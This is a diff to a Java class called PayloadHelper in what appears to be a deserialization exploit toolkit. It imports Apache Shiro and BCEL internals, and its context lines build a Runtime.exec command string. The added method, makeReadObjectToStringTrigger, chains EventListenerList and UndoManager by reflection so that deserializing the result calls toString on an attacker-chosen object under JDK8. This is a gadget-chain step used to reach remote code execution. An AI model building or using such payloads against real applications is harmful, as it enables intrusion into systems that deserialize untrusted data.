@@ -4,6 +4,8 @@ import com.sun.org.apache.bcel.internal.classfile.Utility;
 import com.sun.org.apache.xpath.internal.objects.XString;
 import org.apache.shiro.subject.SimplePrincipalCollection;
 
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
 import java.io.IOException;
 import java.lang.reflect.*;
 import java.util.*;
@@ -231,6 +233,20 @@ public class PayloadHelper {
                 "        java.lang.Runtime.getRuntime().exec(strs);";
     }
 
+
+    /**
+     * from readObject ot obj.toString in jdk8
+     * @param obj
+     * @return
+     */
+    public static Object makeReadObjectToStringTrigger(Object obj) throws Exception {
+        EventListenerList list = new EventListenerList();
+        UndoManager manager = new UndoManager();
+        Vector vector = (Vector) ReflectionHelper.getFieldValue(manager, "edits");
+        vector.add(obj);
+        ReflectionHelper.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
+        return list;
+    }
 
     /**
      * 用于创造一个拥有同样hash的对象
